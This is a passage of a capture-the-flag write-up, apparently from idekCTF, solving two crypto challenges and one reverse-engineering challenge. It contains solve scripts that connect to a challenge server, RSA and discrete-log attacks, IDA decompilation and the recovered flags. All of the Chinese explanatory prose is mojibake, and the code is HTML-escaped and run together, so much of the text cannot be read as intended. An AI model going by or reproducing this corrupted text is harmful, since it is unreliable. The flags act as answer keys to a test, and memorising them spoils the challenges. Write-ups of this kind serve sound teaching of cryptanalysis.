\\text{limit}$çº¦æœ‰1024bitï¼Œä¸¤ç§æƒ…å†µçš„æ¦‚ç‡å‡è¿œå°äº1ï¼Œåœ¨20æ¬¡å†…å¯è®¤ä¸ºéƒ½ä¸ä¼šå‘ç”Ÿï¼Œå³æ‰€æœ‰çŸ©é˜µéƒ½å¯é€†ã€‚ç”±äº $p$ æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„è´¨æ•°ï¼Œå¯¹äºå°äº $p$ çš„ä»»ä½•æ­£æ•´æ•° $a$ ï¼Œéƒ½æœ‰$\\text{gcd}(a,p) = 1$ï¼Œå› æ­¤ä¸€å®šæœ‰é€†å…ƒ $a^{-1}$ å­˜åœ¨ã€‚ä¸”å› ä¸ºè¿™é‡ŒçŸ©é˜µçš„æ¯ä¸ªæ•°éƒ½æ˜¯1~65535ï¼ˆ0ä¸è€ƒè™‘ï¼‰ï¼Œæ‰€ä»¥é™¤äº†1ä»¥å¤–ï¼Œå…¶ä»–æ•°çš„é€†å…ƒå¯ä»¥è¡¨ç¤ºä¸º$\\frac{kp+1}{a}$ï¼Œå®ƒå¤§äº1024-16=1008ä½ï¼Œ1çš„é€†å…ƒå½“ç„¶æ˜¯1ã€‚åœ¨åŒæ ·ä¸è€ƒè™‘1å‡ºç°åœ¨epartä¸­åï¼ŒåŸå§‹çŸ©é˜µçš„é€†çŸ©é˜µä¸­æ¯ä¸ªæ•°éƒ½å¾ˆå¤§ã€‚è¿™æ ·ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“ $x_{30}&gt;x_{29}ï¼Œy_{30}&gt;y_{29}$ ï¼Œæˆ‘ä»¬åªéœ€æ‰¾å‡ºåˆé€‚çš„çŸ©é˜µï¼Œæ¨¡ä¹˜é€†çŸ©é˜µåå¾—åˆ°çš„$(x_{29},y_{29})$æ»¡è¶³ä¸Šå¼å³å¯ã€‚ç”±äºæœ€åˆcaté€‰æ‹©çš„ç¬¬30ä¸ªçŸ©é˜µä¸€å®šæ»¡è¶³ï¼Œæ‰€ä»¥è‡³å°‘æœ‰ä¸€ä¸ªè§£ã€‚æœ€åæˆ‘ä»¬åˆ†æå‡ºç°å¤šä¸ªè§£çš„æ¦‚ç‡ã€‚ç”±ä¸Šå¯çŸ¥ï¼Œé€†çŸ©é˜µä¸­æ¯ä¸ªå…ƒç´ éƒ½å¾ˆå¤§ï¼Œå› æ­¤å®ƒä»¬ä¹‹é—´é—´éš”ä¹Ÿå¾ˆå¤§ï¼Œå¯ä»¥çœ‹ä½œæ˜¯éšæœºé€‰æ‹©çš„çŸ©é˜µã€‚ç”±äºæœ€ç»ˆç»“æœçº¦736ä½ï¼Œæ•…æœŸæœ›çš„å€’æ•°ç¬¬äºŒæ­¥ç»“æœå°äº736ä½ã€‚ç»™å®šæœ€ç»ˆçš„ $(x_{30},y_{30})$ï¼Œ$(x_{29},y_{29})$ æ»¡è¶³æ¡ä»¶çš„æ¦‚ç‡ä¸º$(\\frac{2^{736}}{2^{1024}})^2$ï¼Œå› æ­¤ï¼Œé™¤äº†å†…å®šçš„ä¸€ä¸ªè§£ï¼Œåœ¨125ä¸ªçŸ©é˜µä¸­å‡ºç°å…¶ä»–è§£çš„æ¦‚ç‡åŒæ ·æå°ã€‚è¿™æ ·ï¼Œåªè¦éå†125ä¸ªçŸ©é˜µçš„é€†çŸ©é˜µï¼Œæ¯æ¬¡éƒ½å¯»æ‰¾ä¸€ä¸ªï¼Œä½¿å¾—å€’æ¨çš„å‘é‡ä¸­ï¼Œæ¯ä¸€ä¸ªåˆ†é‡éƒ½å°äºå‰ä¸€æ­¥å‘é‡çš„åˆ†é‡ï¼Œæ‰¾åˆ°30æ¬¡å›åˆ°åŸç‚¹ï¼Œå°±å¾—åˆ°äº†partçš„é€†åºï¼Œå€’åºå‘é€å³å¯ã€‚\nfrom ast import literal_evalfrom typing import List, Tuplefrom Crypto.Util.number import getPrimedef find_candidate_prev_points(        mind: bytes,        endpoint: Tuple[int, int],        limit: int) -&gt; List[Tuple[int, int, int]]:    &quot;&quot;&quot;    For each 8-byte part in &#x27;mind&#x27;, treat it as a 2x2 matrix over F_p (p=limit),    compute its inverse, apply it to &#x27;endpoint&#x27;, and collect those previous points    whose coordinates are both strictly less than the corresponding coordinates of endpoint.    Returns a list of tuples: (index, prev_x, prev_y).    &quot;&quot;&quot;    x_n, y_n = endpoint    candidates = []    for i in range(125):        part = mind[i * 8:(i + 1) * 8]        e0 = int.from_bytes(part[0:2], &quot;big&quot;) % limit        e1 = int.from_bytes(part[2:4], &quot;big&quot;) % limit        e2 = int.from_bytes(part[4:6], &quot;big&quot;) % limit        e3 = int.from_bytes(part[6:8], &quot;big&quot;) % limit        det = (e0 * e3 - e1 * e2) % limit        if det == 0:            continue        det_inv = pow(det, -1, limit)        inv_a = (e3 * det_inv) % limit        inv_b = (-e1 * det_inv) % limit        inv_c = (-e2 * det_inv) % limit        inv_d = (e0 * det_inv) % limit        prev_x = (inv_a * x_n + inv_b * y_n) % limit        prev_y = (inv_c * x_n + inv_d * y_n) % limit        if prev_x &lt; x_n and prev_y &lt; y_n:            candidates.append((i, prev_x, prev_y))    return candidatesdef recover_mind_sequence(        mind: bytes,        start: Tuple[int, int],        end: Tuple[int, int],        limit: int,        steps: int = 30) -&gt; List[bytes]:    &quot;&quot;&quot;    Reverse-engineer the sequence of &#x27;parts&#x27; used by the cat to move from &#x27;start&#x27; to &#x27;end&#x27;.    Returns the list of 8-byte parts in forward order.    &quot;&quot;&quot;    current = end    seq_indices = []    seq_coords = []    for step in range(steps):        candidates = find_candidate_prev_points(mind, current, limit)        if len(candidates) != 1:            raise ValueError(f&quot;Step &#123;step + 1&#125;: expected 1 candidate, found &#123;len(candidates)&#125;&quot;)        idx, prev_x, prev_y = candidates[0]        seq_indices.append(idx)        seq_coords.append((prev_x, prev_y))        current = (prev_x, prev_y)    # Verify we reached the start coordinate    if current != start:        raise ValueError(f&quot;After reverse (&#123;steps&#125; steps), reached &#123;current&#125;, expected start &#123;start&#125;&quot;)    # Reverse indices to forward order and extract parts    seq_indices.reverse()    recovered_parts = [mind[i * 8:(i + 1) * 8] for i in seq_indices]    return recovered_partsdef simulate_walking_sequence(        start: Tuple[int, int],        parts: List[bytes]) -&gt; Tuple[int, int]:    &quot;&quot;&quot;    Simulate the cat&#x27;s walking forward using the recovered parts to verify correctness.    &quot;&quot;&quot;    x, y = start    for part in parts:        # parse matrix        e0 = int.from_bytes(part[0:2], &quot;big&quot;)        e1 = int.from_bytes(part[2:4], &quot;big&quot;)        e2 = int.from_bytes(part[4:6], &quot;big&quot;)        e3 = int.from_bytes(part[6:8], &quot;big&quot;)        xx = e0 * x + e1 * y        yy = e2 * x + e3 * y        x, y = xx, yy    return (x, y)if __name__ == &quot;__main__&quot;:    import os    from pwn import *    conn = remote(&#x27;catch.chal.idek.team&#x27;, 1337)    for iter in range(20):        conn.recvuntil(b&#x27;Co-location: &#x27;)        x0, y0 = literal_eval(conn.recvline().decode())        #print(x0, y0)        conn.recvuntil(b&#x27;Cat\\&#x27;s hidden mind: &#x27;)        mind_hex = conn.recvline().decode()        mind = bytes.fromhex(mind_hex)        conn.recvuntil(b&#x27;Cat now at: &#x27;)        xn, yn = literal_eval(conn.recvline().decode())        limit = 0xe5db6a6d765b1ba6e727aa7a87a792c49bb9ddeb2bad999f5ea04f047255d5a72e193a7d58aa8ef619b0262de6d25651085842fd9c385fa4f1032c305f44b8a4f92b16c8115d0595cebfccc1c655ca20db597ff1f01e0db70b9073fbaa1ae5e489484c7a45c215ea02db3c77f1865e1e8597cb0b0af3241cd8214bd5b5c1491f        conn.recvuntil(b&#x27;Path to recall (hex):&#x27;)        parts = recover_mind_sequence(mind, (x0, y0), (xn, yn), limit)        print(&quot;Recovered sequence of indices and parts:&quot;)        sendpart = &#x27;&#x27;.join(part.hex() for part in parts)        print(sendpart)        # Verify forward simulation        simulated_end = simulate_walking_sequence((x0, y0), parts)        #print(&quot;Simulated end:&quot;, simulated_end)        #print(&quot;Original end: &quot;, (xn, yn))        if simulated_end == (xn, yn):            print(&quot;Verification passed!&quot;)        else:            print(&quot;Verification failed.&quot;)        conn.sendline(sendpart.encode())    conn.interactive()#idek&#123;Catch_and_cat_sound_really_similar_haha&#125;#By the way, è¿™ä¸ªlimitæ¢æˆå…¶ä»–çš„å¤§è´¨æ•°ä¹Ÿå¯ä»¥è¿‡å…³ï¼Œåªè¦æ¯”x_30å’Œy_30å¤§å°±å¯ä»¥äº†ã€‚\ndiamond ticketé¢˜ç›®å¦‚ä¸‹ã€‚\nfrom Crypto.Util.number import *#Some magic from Willy Wonkap = 170829625398370252501980763763988409583a = 164164878498114882034745803752027154293b = 125172356708896457197207880391835698381def chocolate_generator(m:int) -&gt; int:    return (pow(a, m, p) + pow(b, m, p)) % p#The diamond ticket is hiding inside chocolatediamond_ticket = open(&quot;flag.txt&quot;, &quot;rb&quot;).read()assert len(diamond_ticket) == 26assert diamond_ticket[:5] == b&quot;idek&#123;&quot;assert diamond_ticket[-1:] == b&quot;&#125;&quot;diamond_ticket = bytes_to_long(diamond_ticket[5:-1])flag_chocolate = chocolate_generator(diamond_ticket)chocolate_bag = []#Willy Wonka are making chocolatesfor i in range(1337):    chocolate_bag.append(getRandomRange(1, p))#And he put the golden ticket at the endchocolate_bag.append(flag_chocolate)#Augustus ate lots of chocolates, but he can&#x27;t eat all cuz he is full now :Dremain = chocolate_bag[-5:]#Compress all remain chocolates into oneremain_bytes = b&quot;&quot;.join([c.to_bytes(p.bit_length()//8, &quot;big&quot;) for c in remain])#The last chocolate is too important, so Willy Wonka did magic againP = getPrime(512)Q = getPrime(512)N = P * Qe = bytes_to_long(b&quot;idek&#123;this_is_a_fake_flag_lolol&#125;&quot;)d = pow(e, -1, (P - 1) * (Q - 1))c1 = pow(bytes_to_long(remain_bytes), e, N)c2 = pow(bytes_to_long(remain_bytes), 2, N) # A small gift#How can you get it ?print(f&quot;&#123;N = &#125;&quot;)print(f&quot;&#123;c1 = &#125;&quot;)print(f&quot;&#123;c2 = &#125;&quot;) &quot;&quot;&quot;N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649&quot;&quot;&quot;\nä¸€é“å……æ»¡ç€â€œç‰¹åˆ«â€çš„é¢˜ç›®ï¼Œæ¯ä¸€ä¸ªæ•°æ®éƒ½æ˜¯ç²¾å¿ƒç»™å‡ºçš„ã€‚æ‹¿åˆ°é¢˜ç›®ï¼Œå…ˆè¯»ä¸€ä¸‹å·§å…‹åŠ›å·¥å‚çš„æ•…äº‹ï¼Œflagå¼€å¤´å’Œç»“å°¾å…±6 byteså·²ç»™å‡ºï¼Œä¸­é—´20 bytesæœªçŸ¥ã€‚åˆ—è¡¨chocolate_bagåŠ å…¥äº†1337ä¸ª1~pçš„éšæœºæ•°ï¼ŒåˆåŠ å…¥äº† $(a^\\text{flag}+b^\\text{flag})\\text{mod}\\ p$ çš„å€¼â€”â€”çœ‹èµ·æ¥åˆæ˜¯ä¸€ä¸ªç¦»æ•£å¯¹æ•°ï¼Œè€Œä¸”ä¸æ˜¯æ™®é€šçš„ç¦»æ•£å¯¹æ•°ã€‚ç”Ÿæˆç»“æŸåï¼Œremainä»…åŒ…å«æœ€å5ä¸ªæ•°ï¼Œæ‰€å¹¸åŒ…å«flagä¿¡æ¯çš„é¡¹æ˜¯æœ€åä¸€é¡¹ï¼Œå®ƒä¿ç•™äº†ä¸‹æ¥ã€‚å°†è¿™5é¡¹è½¬åŒ–ä¸º16*5=80 bytesçš„å­—èŠ‚ä¸²å¹¶æ‹¼æ¥ï¼Œæœ€åæ˜¯ä¸€ä¸ªRSAåŠ å¯†ã€‚å› æ­¤ï¼Œå¦‚æœæ²¡æœ‰æ„å¤–ï¼Œæˆ‘ä»¬çš„å¤§è‡´é€»è¾‘åº”è¯¥æ˜¯ è§£å¯†RSA -&gt; æå–flag_chocolate -&gt; è¿˜åŸdiamond_ticket ã€‚è¿™æ ·åšä¹Ÿç¡®å®èƒ½å¤Ÿå¾—åˆ°ç­”æ¡ˆã€‚\nç¬¬1æ­¥ï¼šè§£å¯†RSAå·²çŸ¥$m^e\\ \\text{mod}\\ N$å’Œ$m^2\\ \\text{mod}\\ N$ï¼Œä¸” $m$ æ˜¯ä¸€ä¸ª80*8=640bitçš„æ•°ï¼Œ $m^2$ ä¹Ÿæœ‰1280ä½ï¼Œçˆ†ç ´é«˜256ä½ä¸ç°å®ã€‚ç”±äºeæ˜¯ä¸€ä¸ª247ä½çš„å¥‡æ•°ï¼Œ$\\text{gcd}(e,2) = 1$ï¼Œæˆ‘ä»¬ç”¨ $m^2$ å’Œ $m^e$ å‡‘å‡º $m^1$ ã€‚å¯ä»¥æ„é€  $m^1 = m^{1\\ast e-\\frac{e-1}{2}\\ast 2} = m^e \\ast  (m^2)^{-\\frac{e-1}{2}}$ ï¼Œæ¨¡ $N$ ä¸‹è¿ç®—å¾—åˆ° $m$ ã€‚\nç¬¬2æ­¥ï¼šæå–flag_chocolateæˆ‘ä»¬åªè¦æœ€åä¸€é¡¹ï¼Œæ•…æå–æœ€å16ä¸ªbyteï¼Œå’±å›¾çœäº‹å°±å…¨éƒ¨ä¸€èµ·æå–äº†ï¼Œå¹¶è¾“å‡ºchunksçš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚\nç¬¬3æ­¥ï¼šè¿˜åŸdiamond_ticketæ­¤æ—¶æˆ‘ä»¬æ‹¥æœ‰ç­‰å¼$(a^\\text{flag}+b^\\text{flag})\\text{mod}\\ p = c$ ï¼Œå·²çŸ¥a, b, c, pï¼Œæ±‚flagã€‚åœ¨å’¨è¯¢äº†Deepseekç­‰AIå¹¶é€šè¿‡ä»£ç éªŒè¯åï¼Œæˆ‘ä»¬å‘ç°äº†ç»™å®šçš„a, b, pæœ‰ä¸€äº›æœ‰è¶£çš„æ€§è´¨â€”â€”$p$ æ˜¯ä¸€ä¸ªè´¨æ•°ï¼Œä½† $p-1 = 2 Ã— 40841 Ã— 50119 Ã— 51193 Ã— 55823 Ã— 57809 Ã— 61991 Ã— 63097 Ã— 64577$ ï¼Œæ˜¯å¾ˆå¤šå°ç´ æ•°ä¹‹ç§¯ï¼ˆ $p-1$ æ˜¯å…‰æ»‘æ•°ï¼‰ã€‚$a$ å’Œ $b$ çš„é˜¶å‡ä¸º $\\frac{p-1}{2}$ ï¼Œä¸” $b = a^{73331}\\ \\text{mod}\\ p$å› æ­¤ï¼Œå¯¹äºé—®é¢˜$(a^\\text{flag}+b^\\text{flag})\\text{mod}\\ p = c$ï¼Œå°†å…¶è½¬åŒ–ä¸º$((a^\\text{flag}+(a^\\text{flag})^{73331}) - c )\\ \\text{mod}\\ p = 0$ï¼Œå³å¯»æ‰¾$f(x) = x^{73331}+x-c$ çš„ä¸€ä¸ªæ ¹$x_0$ã€‚ä¸€æ—¦æ‰¾åˆ°è¿™ä¸ªæ ¹ï¼Œå®ƒå°±æ˜¯ $a^\\text{flag}$ ï¼Œè½¬åŒ–ä¸ºæ™®é€šçš„ç¦»æ•£å¯¹æ•°ï¼Œå†åˆ©ç”¨Pohlig-Hellmanç®—æ³•ï¼Œæ±‚å¾—é˜¶ä¸ºå…‰æ»‘æ•°çš„ç¦»æ•£å¯¹æ•°ã€‚ä½¿ç”¨cypariåº“å¯¹è¯¥å‡½æ•°è¿›è¡Œæ±‚æ ¹ï¼Œç›¸æ¯”sageçš„roots()å‡½æ•°ï¼Œå®ƒå¿«å¾—å¤šï¼Œåªéœ€è¦åå¤šç§’å°±èƒ½å¾—åˆ°ç­”æ¡ˆã€‚å†åˆ©ç”¨sageè‡ªå¸¦çš„discrete_log()å‡½æ•°æ±‚è§£å³å¯å¾—åˆ°flagã€‚\nâ€¦â€¦çœŸçš„å—ï¼Ÿå°†æ±‚å‡ºçš„ x = 4807895356063327854843653048517090061 è½¬æ¢æˆbytesåä¸éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦ï¼Œè¯´æ˜æˆ‘ä»¬è¿˜æœ‰è·¯æ²¡èµ°å®Œï¼Œä½†æ˜¯ assert chocolate_generator(x) == c ä¹Ÿé€šè¿‡äº†ï¼Œè¯´æ˜æˆ‘ä»¬ç¡®å®æ‰¾åˆ°äº†æ­£ç¡®çš„ä¸€ä¸ªxã€‚æ±‚ä¸€ä¸‹xçš„ä½æ•°ï¼Œå®ƒæœ‰122ä½ï¼Œè€Œdiamond_ticketæœ‰20*8=160ä½ã€‚ç”±äº $a$, $b$ çš„é˜¶ç›¸ç­‰ï¼Œæ•…$a^\\frac{p-1}{2}\\ \\text{mod}\\ p = b^\\frac{p-1}{2}\\ \\text{mod}\\ p = 1$ï¼Œå› æ­¤é™¤äº† $x$ ä»¥å¤–ï¼Œæ‰€æœ‰ $x+k\\ast \\frac{p-1}{2}$ ä¹Ÿéƒ½æ˜¯å¯èƒ½çš„diamond_ticketï¼Œ$k$ ä¸ºæ­£æ•´æ•°ã€‚å¯¹äºè¯¥å–ä»€ä¹ˆ $k$ æ²¡æœ‰å¥½çš„åŠæ³•ï¼Œä¸€å…±20 bytesï¼ˆ160ä½ï¼‰ï¼Œæœ€é«˜ä½çš„byteæœ€å¤šæ˜¯0x7E(01111110)ï¼Œæ•…diamond_ticketæœ€å¤šæœ‰159ä½ï¼›æœ€å°‘æ˜¯0x20(00100000)ï¼Œdiamond_ticketæœ€å°‘ä¹Ÿæœ‰158ä½ã€‚æ ¹æ® $\\text{diamond_ticket} = x+k\\ast \\frac{p-1}{2}$ å¯çŸ¥ $k$ è‡³å°‘ä¸º31ä½ï¼Œæœ€å¤šä¸º32ä½ï¼Œæˆ‘ä»¬éå†k in range(2**31, 2**33)å³å¯ã€‚ç”±äºæ•°æ®è¿‡å¤§ï¼Œé‡‡ç”¨å¤šçº¿ç¨‹å¹¶è¡ŒåŠ é€Ÿï¼Œå®æµ‹æœ¬æœº32çº¿ç¨‹çº¦20åˆ†é’Ÿã€‚ä»¥åŠï¼Œæˆ‘çš„å¤šçº¿ç¨‹å†™å¾—ä¸€å›¢ç³Ÿï¼ŒæŠŠèµ·ç‚¹ä¿®æ”¹ä¸º $2^{31}$ å°±ç»™ä¸å‡ºç»“æœï¼Œæ‰€ä»¥ä»£ç æ˜¯ä» $0$ éå†åˆ° $2^{33}$ ï¼Œå¤šèŠ±äº†çº¦$\\frac{1}{4}$çš„æ—¶é—´ã€‚\n######################################################pythonfrom Crypto.Util.number import *N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649e = 186211850710224327090212578283834164039515361235211653610924153794366237821# å·²çŸ¥é‡ï¼šN, e, c1, c2# è®¡ç®— temp = (e-1)//2temp = (e - 1) // 2# å…ˆç®— t = c2^temp mod Nt = pow(c2, temp, N)# å†ç®— t çš„æ¨¡åå…ƒç´  inv_t = t^&#123;-1&#125; mod Ninv_t = inverse(t, N)# æœ€å m = c1 * inv_t mod Nm = (c1 * inv_t) % Nassert pow(m,e,N) == c1assert pow(m,2,N) == c2# å°†æ•´æ•° m è½¬æˆå­—èŠ‚ä¸²remain_bytes = long_to_bytes(m)print(remain_bytes)#b&#x27;&#123;\\xd1\\xdf\\xeb|F\\xce\\xbc\\x11\\xd8nZ\\x8b\\xfc\\xaebN\\xf4\\x8a&#123;0,\\x01\\xb7\\xf9\\xe7\\xb5q\\xc93%\\xba\\x0b\\x15\\x94g\\x0b|\\xd8 \\xf38\\xf2\\xe2#\\t\\x0ci^\\x10\\x86\\x94\\x12\\xcb\\xe7b/\\xefj\\xb5\\x05\\xfb\\xc8\\xf9J\\xebU|z\\x10\\xd3|\\xa7\\xec\\xd1\\x9d\\x17\\\\P\\xb3&#x27;#å…¶ä¸­\\\\è¡¨ç¤ºä¸€ä¸ªåæ–œæ ï¼Œç®—ä¸€ä¸ªbyte#Some magic from Willy Wonkap = 170829625398370252501980763763988409583a = 164164878498114882034745803752027154293b = 125172356708896457197207880391835698381L = p.bit_length() // 8   # =128//8 =16chunks = [remain_bytes[i*L:(i+1)*L] for i in range(5)]print(bytes_to_long(chunks[-1]))#99584795316725433978492646071734128819######################################################sagedef chocolate_generator(m:int) -&gt; int:    return (pow(a, m, p) + pow(b, m, p)) % pc = 99584795316725433978492646071734128819import cypari2pari = cypari2.Pari()def roots_mod_p_via_pari(k, c, p):    y = pari(&#x27;y&#x27;)    f = y**k + y - c    return list(map(int, pari(f).polrootsmod(p)))k = 73331roots = roots_mod_p_via_pari(k, c, p)print(&quot;roots:&quot;, roots)#[126961729658296101306560858021273501485]a = 164164878498114882034745803752027154293for y in roots:    # æŠŠ a, y è§†ä¸º GF(p) ä¸­çš„å…ƒç´     F = GF(p)    A = F(a)    Y = F(y)    # è°ƒç”¨ discrete_log    x = discrete_log(Y, A)    assert chocolate_generator(x) == c    print(&quot;è§£å¾— x =&quot;, x)#4807895356063327854843653048517090061######################################################pythondef is_all_printable(bs: bytes) -&gt; bool:    return all(0x20 &lt;= b &lt;= 0x7E for b in bs)import multiprocessing# ä¸Šä¸€éƒ¨åˆ†ç»“æœBASE = 4807895356063327854843653048517090061from tqdm import tqdmimport os# å­ä»»åŠ¡ï¼šåœ¨ç»™å®šåŒºé—´å†…æŸ¥æ‰¾æ»¡è¶³æ¡ä»¶çš„ jdef worker(start: int, end: int, queue):    results = []    for j in range(start, end):        val = BASE + (p-1)//2 * j        text = long_to_bytes(val)        if is_all_printable(text):            results.append((j, text))        if j % 10000 == 0:            queue.put(10000)    return resultsif __name__ == &#x27;__main__&#x27;:    multiprocessing.set_start_method(&#x27;spawn&#x27;)  # For compatibility, especially on Windows    cpu_count = multiprocessing.cpu_count()    total = 2**33    chunk = total // cpu_count    # ä½¿ç”¨ Manager å’Œ Queue è·Ÿè¸ªè¿›åº¦    with multiprocessing.Manager() as manager:        queue = manager.Queue()        pool = multiprocessing.Pool(processes=cpu_count)        # ç”¨ tqdm æ˜¾ç¤ºæ€»è¿›åº¦        with tqdm(total=total, desc=&quot;Brute-forcing&quot;, unit=&quot;j&quot;) as pbar:            results = []            tasks = []            for i in range(cpu_count):                start = i * chunk                end = start + chunk if i &lt; cpu_count - 1 else total                tasks.append(pool.apply_async(worker, (start, end, queue)))            # å®æ—¶æ›´æ–°è¿›åº¦æ¡            finished = 0            while finished &lt; total:                inc = queue.get()                pbar.update(inc)                finished += inc            # ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆå¹¶æ”¶é›†ç»“æœ            pool.close()            pool.join()            for task in tasks:                for j, text in task.get():                    print(f&quot;Found j=&#123;j&#125;: &#123;text&#125;&quot;)                    #Found j=7781310273: b&#x27;tks_f0r_ur_t1ck3t_xD&#x27;#idek&#123;tks_f0r_ur_t1ck3t_xD&#125;\nREconstructioné™„ä»¶æ˜¯ä¸€ä¸ªelfç¨‹åºï¼Œè¯•éªŒå¾—çŸ¥ï¼Œå½“æ²¡æœ‰å‚æ•°æ—¶ï¼Œè¾“å‡ºğŸ‘€ï¼Œæœ‰å‚æ•°æ—¶ï¼Œè¾“å‡ºWrong! ï¼Œæœç´¢å­—ç¬¦ä¸²å‘ç°ï¼š\n.rodata:0000000000403013 aCorrect        db &#x27;Correct!&#x27;,0         ; DATA XREF: sub_401050:loc_401159â†‘o.rodata:000000000040301C aWrong          db &#x27;Wrong!&#x27;,0           ; DATA XREF: sub_401050+CEâ†‘o\næ¨æµ‹ä¸»å‡½æ•°æ˜¯sub_401050ï¼Œæ‰¾åˆ°è¯¥å‡½æ•°ï¼š\nunsigned __int64 __fastcall sub_401050(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)&#123;  __int64 v6; // rcx  unsigned __int64 i; // rax  int v8; // edx  __int64 v9; // rdx  int v10; // eax  unsigned int v11; // ebp  signed __int64 v12; // r12  unsigned __int8 *v13; // rax  unsigned __int64 result; // rax  char v15[24]; // [rsp+0h] [rbp-1038h] BYREF  unsigned __int64 v16; // [rsp+1008h] [rbp-30h]  LODWORD(v6) = 0;  v16 = __readfsqword(0x28u);  for ( i = 0; i != 42; ++i )  &#123;    v8 = v6 ^ (unsigned __int8)::a3[i];    v6 += 31;    v9 = (i &gt;&gt; 1) ^ v8 ^ 0x5A;    byte_405140[i] = v9;  &#125;  byte_40516A = 0;  v10 = sub_401670((__int64)&quot;/proc/self/cmdline&quot;, 0, v9, v6, a5, a6, v15[0]);  v11 = v10;  if ( v10 &gt;= 0 )  &#123;    v12 = sub_401A10((unsigned int)v10, v15, 4095);    sub_4019C0(v11);    if ( v12 &gt; 0 )    &#123;      v15[v12] = 0;      v13 = sub_401830(v15, 0, v12);      if ( v13 )      &#123;        if ( v13 + 1 &lt; (unsigned __int8 *)&amp;v15[v12] )        &#123;          if ( (unsigned int)sub_401910(v13 + 1, byte_405140) )            sub_401770(&quot;Wrong!&quot;);          else            sub_401770(&quot;Correct!&quot;);          sub_401010(0);        &#125;      &#125;    &#125;  &#125;  result = v16 - __readfsqword(0x28u);  if ( result )    sub_401610();  return result;&#125;\nå› æ­¤ï¼Œæ­£ç¡®ç­”æ¡ˆçš„ç”Ÿæˆè¿‡ç¨‹æ˜¯\nLODWORD(v6) = 0;for ( i = 0; i != 42; ++i )&#123;  v8 = v6 ^ (unsigned __int8)::a3[i];  v6 += 31;  v9 = (i &gt;&gt; 1) ^ v8 ^ 0x5A;  byte_405140[i] = v9;&#125;\nåˆ†æå®ƒå¤ªéº»çƒ¦äº†ï¼Œç›´æ¥åŠ¨æ€è°ƒè¯•åˆ°è¿™ä¸ªä½ç½®ï¼Œæå–byte_405140å¦‚ä¸‹ã€‚\n.bss:0000000000405140 ; _BYTE byte_405140[42].bss:0000000000405140 byte_405140 db 69h, 64h, 65h, 6Bh, 7Bh, 68h, 65h, 34h, 72h, 64h, 5Fh, 30h, 66h, 5Fh.bss:0000000000405140                                         ; DATA XREF: sub_401050+1Câ†‘o.bss:000000000040514E db 63h, 6Fh, 6Eh, 73h, 74h, 72h, 75h, 63h, 74h, 6Fh, 72h, 73h, 3Fh, 5Fh.bss:000000000040515C db 6Eh, 6Fh, 77h, 5Fh, 79h, 6Fh, 75h, 5Fh, 64h, 31h, 64h, 21h, 21h, 7Dh.bss:000000000040516A byte_40516A db 0                        ; DATA XREF: sub_401050+6Câ†‘w\nç»­ä¸Šåé¢çš„byte_40516A = 0;ï¼Œç›´æ¥å¯ä»¥åœ¨IDAä¸­æ•´åˆæˆå­—ç¬¦ä¸²ï¼š\n.bss:0000000000405140 aIdekHe4rd0fCon db &#x27;idek&#123;he4rd_0f_constructors?_now_you_d1d!!&#125;&#x27;,0.bss:0000000000405140                                         ; DATA XREF: sub_401050+1Câ†‘o\näºæ˜¯æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†â€”â€”idek&#123;he4rd_0f_constructors?_now_you_d1d!!&#125;\nä½†æ˜¯è¿™å¤ªå¿«äº†ï¼Œäºæ˜¯æ°´ä¸€ä¸‹wpï¼ˆÃ—ï¼‰\nå¯¹è¾“å…¥çš„åˆ¤å®šè¿‡ç¨‹æ˜¯\nif ( (unsigned int)sub_401910(v13 + 1, byte_405140) )  sub_401770(&quot;Wrong!&quot;);else  sub_401770(&quot;Correct!&quot;);\nä¸­é—´å°±æ˜¯æˆªå–è¾“å…¥çš„è¿‡ç¨‹\nv10 = sub_401670((__int64)&quot;/proc/self/cmdline&quot;, 0, v9, v6, a5, a6, v15[0]);v11 = v10;if ( v10 &gt;= 0 )&#123;  v12 = sub_401A10((unsigned int)v10, v15, 4095);  sub_4019C0(v11);  if ( v12 &gt; 0 )  &#123;    v15[v12] = 0;    v13 = sub_401830(v15, 0, v12);    ...\nåˆ¤å®šè¾“å…¥çš„å‡½æ•° sub_401910 æ˜¯\n__int64 __fastcall sub_401910(unsigned __int8 *a1, unsigned __int8 *a2)&#123;  unsigned __int8 v2; // dl  int v3; // ecx  __int64 v4; // rax  v2 = *a1;  v3 = *a2;  v4 = 1;  if ( *a1 != (_BYTE)v3 )    return (unsigned int)v2 - v3;  while ( v2 )  &#123;    v2 = a1[v4++];    v3 = a2[v4 - 1];    if ( v2 != (_BYTE)v3 )      return (unsigned int)v2 - v3;  &#125;  return (unsigned int)-v3;&#125;\nå…¶è¦æ±‚ *a1 å’Œ *a2 